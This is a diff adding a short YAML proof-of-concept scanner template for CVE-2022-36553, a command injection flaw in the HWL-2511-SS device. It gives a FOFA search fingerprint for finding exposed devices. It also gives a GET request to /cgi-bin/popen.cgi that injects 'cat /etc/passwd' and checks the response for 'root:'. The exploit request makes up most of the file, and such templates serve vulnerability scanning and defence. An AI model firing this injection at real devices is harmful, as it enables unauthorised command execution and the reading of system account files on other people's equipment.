@@ -1,0 +1,16 @@
+id: poc-yaml-hml-2511-ss-command-injection-2511-ss-command-injection
+info:
+  name: HWL-2511-SS v1.05 命令注入漏洞(CVE-2022-36553)
+  severity: critical
+  tags:
+  - CVE-2022-36553
+  - 两高一弱
+  finger: hml 2511 ss
+  fofa: title="index" && header="lighttpd/1.4.30"
+requests:
+- method: GET
+  path: /cgi-bin/popen.cgi?command=cat%20/etc/passwd
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<")
+variables: {}
+transport: http
